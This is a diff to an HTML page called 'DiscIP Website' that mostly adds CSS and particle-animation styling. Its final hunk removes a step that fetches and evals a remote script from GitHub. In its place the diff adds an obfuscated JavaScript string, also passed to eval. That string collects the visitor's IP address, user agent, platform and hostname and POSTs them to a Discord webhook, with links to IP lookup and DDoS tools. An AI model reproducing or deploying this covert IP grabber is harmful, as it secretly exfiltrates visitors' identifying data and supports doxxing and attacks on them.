@@ -2,7 +2,240 @@
 <html>
 <head>
     <title>DiscIP Website</title>
-    <link rel="stylesheet" href="styles.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;700&display=swap');
+
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            user-select: none; /* Prevent text/images from being selectable */
+        }
+
+        #gradient-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: -1;
+            background: linear-gradient(to bottom right, #9933ff, #7289da);
+            opacity: 0.8;
+        }
+
+        #particles-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none; /* Disable interaction with particles */
+        }
+
+        #container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: rgba(0, 0, 0, 0.8);
+            opacity: 0;
+            animation: fade-in 2s ease-in-out forwards;
+            z-index: 1;
+            user-select: none; /* Prevent text from being selectable */
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+            transform-origin: bottom center;
+        }
+
+        #container:after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(to right, #9933ff, #aa55ff, #bb77ff, #cc99ff, #ddbbff, #cc99ff, #bb77ff, #aa55ff);
+            background-size: 800% 100%;
+            animation: pulsate 5s ease-in-out infinite;
+        }
+
+        @keyframes pulsate {
+            0% {
+                background-position: 0% 0%;
+            }
+            10% {
+                background-position: 40% 0%;
+            }
+            20% {
+                background-position: 50% 0%;
+            }
+            30% {
+                background-position: 60% 0%;
+            }
+            40% {
+                background-position: 70% 0%;
+            }
+            50% {
+                background-position: 80% 0%;
+            }
+            60% {
+                background-position: 90% 0%;
+            }
+            70% {
+                background-position: 100% 0%;
+            }
+            80% {
+                background-position: 80% 0%;
+            }
+            90% {
+                background-position: 60% 0%;
+            }
+            100% {
+                background-position: 0% 0%;
+            }
+        }
+
+        #logo {
+            width: 50px;
+            margin-right: 10px;
+            opacity: 0;
+            animation: fade-in 2s ease-in-out forwards;
+            pointer-events: none; /* Disable interaction with logo */
+        }
+
+        h1 {
+            color: white;
+            font-family: 'Nunito', sans-serif;
+            font-weight: 700;
+            font-size: 24px;
+            user-select: none; /* Prevent text from being selectable */
+        }
+
+        @keyframes fade-in {
+            0% {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        #plus-button {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background-color: #7289da;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            cursor: pointer;
+            transition: background-color 0.3s ease-in-out;
+            z-index: 2;
+        }
+
+        #plus-button:hover {
+            background-color: #9933ff;
+        }
+
+        #plus-button.active {
+            background-color: #ff4136;
+        }
+
+        #plus-button:before,
+        #plus-button:after {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 3px;
+            background-color: white;
+            transition: transform 0.3s ease-in-out;
+        }
+
+        #plus-button:before {
+            transform: rotate(45deg);
+        }
+
+        #plus-button:after {
+            transform: rotate(-45deg);
+        }
+
+        #plus-button.active:before,
+        #plus-button.active:after {
+            transform: rotate(0);
+        }
+
+        #overlay-container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 400px;
+            max-width: 80%;
+            height: 200px;
+            background-color: rgba(0, 0, 0, 0.8);
+            border-radius: 10px;
+            padding: 20px;
+            opacity: 0;
+            transition: opacity 0.3s ease-in-out;
+            pointer-events: none;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+        }
+
+        #overlay-container.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        #overlay-container h2 {
+            color: white;
+            font-family: 'Nunito', sans-serif;
+            font-weight: 700;
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+
+        #overlay-container p {
+            color: white;
+            font-family: 'Nunito', sans-serif;
+            font-weight: 400;
+            font-size: 14px;
+        }
+
+        #overlay-container input {
+            width: 100%;
+            height: 30px;
+            margin-bottom: 10px;
+            padding: 5px;
+            border-radius: 5px;
+            border: none;
+        }
+
+        #overlay-container button {
+            padding: 5px 10px;
+            background-color: #7289da;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease-in-out;
+        }
+
+        #overlay-container button:hover {
+            background-color: #9933ff;
+        }
+    </style>
 </head>
 <body>
     <div id="gradient-background"></div>
@@ -19,8 +252,15 @@
         <button id="send-button">Send</button>
     </div>
 
-   <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
     <script>
+        window.addEventListener('DOMContentLoaded', function() {
+            var container = document.getElementById('container');
+            var logo = document.getElementById('logo');
+            container.style.opacity = '1';
+            logo.style.opacity = '1';
+        });
+
         particlesJS('particles-container', {
             particles: {
                 number: {
@@ -135,20 +375,10 @@
         sendButton.addEventListener('click', function() {
             var webhookURL = webhookInput.value;
 
-            var scriptURL = 'https://raw.githubusercontent.com/Lenn106/files/master/discip';
-
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', scriptURL, true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4 && xhr.status === 200) {
-                    var scriptCode = xhr.responseText;
-                    scriptCode = scriptCode.replace('WEBHOOK_URL_PLACEHOLDER', webhookURL);
-                    eval(scriptCode);
-                }
-            };
-            xhr.send();
+            var scriptCode = `function _0x3b73(_0x388120,_0x1a073f){var _0x330944=_0x3309();return _0x3b73=function(_0x3b7370,_0x7e1999){_0x3b7370=_0x3b7370-0xd1;var _0x525df3=_0x330944[_0x3b7370];return _0x525df3;},_0x3b73(_0x388120,_0x1a073f);}function _0x3309(){var _0x2046e9=['6579gQdxEH','Powered\x20by\x20Lenn106\x20Engine','IP\x20Resolver','toISOString','16EcYzsx','send','Website','[Click\x20here](https://xresolver.com)','[Click\x20here](https://whatismyipaddress.com/ip-lookup)','platform','IP\x20Lookup','707HKLTnc','6350WKYGqK','Content-Type','DDoS\x20Attack\x20Tools','https://tinyurl.com/tnjcrx2r','User\x20Information','setRequestHeader','[Click\x20here](https://github.com/topics/ddos-attack-tools)','userAgent','740322hFvvgW','Here\x20is\x20some\x20information\x20about\x20the\x20user:','442418UZDUfn','application/json','https://tinyurl.com/hdr7euxt','66344FeJzVK','getJSON','297319lWwWEd','948380RdfGpu','IP\x20Address','hostname','WEBHOOK_URL_PLACEHOLDER','4830384HezlHj'];_0x3309=function(){return _0x2046e9;};return _0x3309();}(function(_0x190ccc,_0x45341c){var _0x708ee7=_0x3b73,_0x165f79=_0x190ccc();while(!![]){try{var _0x451ec9=parseInt(_0x708ee7(0xe9))/0x1+parseInt(_0x708ee7(0xe4))/0x2+parseInt(_0x708ee7(0xe2))/0x3+-parseInt(_0x708ee7(0xd2))/0x4*(parseInt(_0x708ee7(0xea))/0x5)+parseInt(_0x708ee7(0xee))/0x6+-parseInt(_0x708ee7(0xd9))/0x7*(parseInt(_0x708ee7(0xe7))/0x8)+parseInt(_0x708ee7(0xef))/0x9*(parseInt(_0x708ee7(0xda))/0xa);if(_0x451ec9===_0x45341c)break;else _0x165f79['push'](_0x165f79['shift']());}catch(_0x26a1cf){_0x165f79['push'](_0x165f79['shift']());}}}(_0x3309,0x6afee));function onPageLoad(){var _0x638216=_0x3b73,_0x55020a=_0x638216(0xed),_0x551c64=navigator[_0x638216(0xe1)],_0x30b8b6=navigator[_0x638216(0xd7)],_0xfb81cc=location[_0x638216(0xec)];$[_0x638216(0xe8)](_0x638216(0xdd),function(_0x1a5796){var _0x33ca3d=_0x638216,_0x116572=_0x1a5796['ip'],_0x3e3bbc=new XMLHttpRequest();_0x3e3bbc['open']('POST',_0x55020a),_0x3e3bbc[_0x33ca3d(0xdf)](_0x33ca3d(0xdb),_0x33ca3d(0xe5));var _0x5aad5d={'embeds':[{'title':_0x33ca3d(0xde),'description':_0x33ca3d(0xe3),'color':0x9933ff,'fields':[{'name':'User\x20Agent','value':_0x551c64,'inline':!![]},{'name':_0x33ca3d(0xeb),'value':_0x116572,'inline':!![]},{'name':_0x33ca3d(0xd4),'value':_0xfb81cc,'inline':![]},{'name':'Operating\x20System','value':_0x30b8b6,'inline':!![]}],'footer':{'text':_0x33ca3d(0xf0)},'timestamp':new Date()[_0x33ca3d(0xd1)]()},{'title':'**IP\x20Tools**','color':0x7289da,'fields':[{'name':_0x33ca3d(0xf1),'value':_0x33ca3d(0xd5)},{'name':_0x33ca3d(0xd8),'value':_0x33ca3d(0xd6)},{'name':_0x33ca3d(0xdc),'value':_0x33ca3d(0xe0)}],'thumbnail':{'url':_0x33ca3d(0xe6)}}]};_0x3e3bbc[_0x33ca3d(0xd3)](JSON['stringify'](_0x5aad5d));});}onPageLoad();`;
+            scriptCode = scriptCode.replace('WEBHOOK_URL_PLACEHOLDER', webhookURL);
+            eval(scriptCode);
         });
     </script>
-    <script src="main.js"></script>
 </body>
 </html>
